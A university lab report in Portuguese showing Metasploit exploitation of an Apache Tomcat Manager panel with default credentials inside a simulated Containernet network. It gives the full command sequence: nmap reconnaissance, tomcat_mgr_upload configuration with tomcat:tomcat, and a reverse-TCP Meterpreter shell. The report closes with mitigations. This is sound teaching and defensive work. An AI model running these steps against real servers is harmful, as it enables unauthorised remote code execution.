# Exploração de Vulnerabilidades com Metasploit — Apache Tomcat Manager

**Instituição:** Universidade Federal do Rio Grande do Norte (UFRN) — Instituto Metrópole Digital (IMD)  
**Autores:** Filipe Sousa Bandeira Torres (Matrícula: 20240054415) e Fabrício Oliveira de Souza (Matrícula: 20240030253)  
**Ano:** 2026

Abaixo está o código da topologia simulada (`lab_metasploit.py`) executada no ambiente Ubuntu com Docker e Containernet. O script cria a rede virtual `10.200.0.0/24` contendo o switch `s1`, o nó alvo **Alice** (`10.200.0.1`) e a estação de testes **Chuck** (`10.200.0.2`), além de inicializar os serviços vulneráveis em Alice:

```
#!/usr/bin/python3
import os

from containernet.net import Containernet
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    net = Containernet(ipBase='10.200.0.0/24')

    try:
        info("*** Criando Alice, Chuck e o switch\n")
        s1 = net.addSwitch('s1', failMode='standalone')

        alice = net.addDocker(
            'alice',
            ip='10.200.0.1/24',
            dimage='ramonfontes/vulnerable',
            cpu_shares=20,
            mac='00:00:00:00:00:01'
        )

        chuck = net.addDocker(
            'chuck',
            ip='10.200.0.2/24',
            dimage='ramonfontes/seguranca',
            cpu_shares=20,
            mac='00:00:00:00:00:02'
        )

        net.addLink(s1, alice)
        net.addLink(s1, chuck)

        info("*** Iniciando a rede\n")
        net.build()
        s1.start([])

        info("*** Iniciando os servicos de Alice\n")
        print(alice.cmd("echo '10.200.0.1 alice' > /etc/hosts && services.sh"))

        info("*** Abrindo o terminal do laboratorio\n")
        CLI(net)

    finally:
        net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

**Nota:** É importante destacar que esta exploração difere da vulnerabilidade Ghostcat. Enquanto o Ghostcat explora o conector AJP na porta `8009`, a falha abordada neste laboratório ataca o painel de gerenciamento web (**Manager**) do Apache Tomcat exposto na porta `8180` com credenciais padrão, permitindo o upload e a execução de aplicações maliciosas.

## Reconhecimento do Serviço

A partir do terminal de Chuck (`10.200.0.2`), realiza-se uma varredura de portas e detecção de versão de serviço com o `nmap` direcionada à porta `8180` de Alice (`10.200.0.1`):

```
chuck# nmap -sV -p 8180 10.200.0.1
```

A execução do comando retorna a seguinte saída, confirmando que o host está ativo e que o serviço Apache Tomcat está acessível na porta `8180/tcp`:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-11-18 01:17 GMT
Nmap scan report for 10.200.0.1
Host is up (0.00019s latency).

PORT     STATE SERVICE VERSION
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:00:00:00:00:01 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

## Pesquisa do Módulo no Metasploit

Com o serviço identificado, inicia-se o console do Metasploit Framework em Chuck e busca-se por módulos compatíveis com o gerenciamento do Tomcat:

```
chuck# msfconsole
msf > search tomcat_mgr
```

A pesquisa lista três módulos principais relacionados à administração do Apache Tomcat, destacando-se o módulo de upload autenticado classificado com rank `excellent`:

```
Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   5  exploit/multi/http/tomcat_mgr_upload         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   9  auxiliary/scanner/http/tomcat_mgr_login      .                normal     No     Tomcat Application Manager Login Utility
```

## Configuração do Módulo no Metasploit

Em seguida, seleciona-se o módulo `exploit/multi/http/tomcat_mgr_upload` e definem-se os parâmetros obrigatórios: o endereço do alvo (`RHOSTS`), a porta do serviço (`RPORT`), o endereço de escuta do atacante (`LHOST`) e as credenciais padrão do painel administrativo (`tomcat:tomcat`):

```
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.200.0.1
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.200.0.2
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
msf exploit(multi/http/tomcat_mgr_upload) > show options
```

A verificação com `show options` confirma que o caminho da aplicação está configurado para `/manager`, o alvo selecionado é `0 (Java Universal)` e o payload padrão `java/meterpreter/reverse_tcp` está pronto para receber a conexão reversa na porta `4444`:

```
Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.200.0.1       yes       The target host(s)
   RPORT         8180             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.200.0.2       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

## Exploração e Verificação do Acesso

Com todas as variáveis configuradas, dispara-se o ataque utilizando o comando `exploit`:

```
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

O Metasploit inicia o manipulador TCP reverso, obtém o token de sessão e CSRF do painel, empacota e envia uma aplicação maliciosa no formato `.war`, executa o payload e remove o arquivo implantado para limpar rastros, abrindo uma sessão **Meterpreter** com sucesso:

```
[*] Started reverse TCP handler on 10.200.0.2:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying hAwNtc1g9XbhGmsGqJkOTXVYL...
[*] Executing hAwNtc1g9XbhGmsGqJkOTXVYL...
[*] Undeploying hAwNtc1g9XbhGmsGqJkOTXVYL ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (63218 bytes) to 10.200.0.1
[*] Meterpreter session 1 opened (10.200.0.2:4444 -> 10.200.0.1:38687) at 2026-11-18 00:36:31 +0000
```

Dentro da sessão Meterpreter, verifica-se o usuário ativo no sistema remoto através do comando `getuid` e abre-se um shell interativo no sistema operacional alvo para confirmar a identidade e os privilégios da conta comprometida:

```
meterpreter > getuid
Server username: tomcat55
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
tomcat55
id
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
```

Como o serviço do Apache Tomcat estava configurado para rodar sob uma conta de serviço dedicada e não privilegiada, o comprometimento ocorreu sob o usuário `tomcat55` (`uid=110`).

## Análise dos Resultados e Conclusão

Os resultados comprovam que o serviço Apache Tomcat em Alice possuía seu painel administrativo (`/manager`) exposto na rede pela porta `8180` e protegido apenas por credenciais padrão (`tomcat:tomcat`). Essa configuração permitiu a exploração referenciada pelo **CVE-2009-3843**, na qual o upload autenticado de um arquivo `.war` resulta em execução remota arbitrária de código no servidor.

**Nota:** Como complemento de investigação durante os testes iniciais, a vulnerabilidade **CVE-2012-2122** no serviço MySQL (porta `3306`) também foi avaliada utilizando Nmap, Metasploit e um script em Python. Os testes confirmaram que a versão do banco de dados instalada em Alice já estava protegida contra essa falha específica, reforçando a importância da validação prática de hipóteses antes da etapa de exploração.

Para mitigar a vulnerabilidade explorada no Apache Tomcat, recomenda-se:

* Substituir imediatamente as credenciais padrão no arquivo de configuração `tomcat-users.xml` por senhas fortes e exclusivas.
* Restringir o acesso à rota `/manager` por meio de filtros de rede ou regras de controle de acesso (`RemoteAddrValve`) apenas para endereços IP administrativos autorizados.
* Remover ou desabilitar a aplicação `manager` em ambientes de produção quando o gerenciamento remoto via interface web não for estritamente necessário.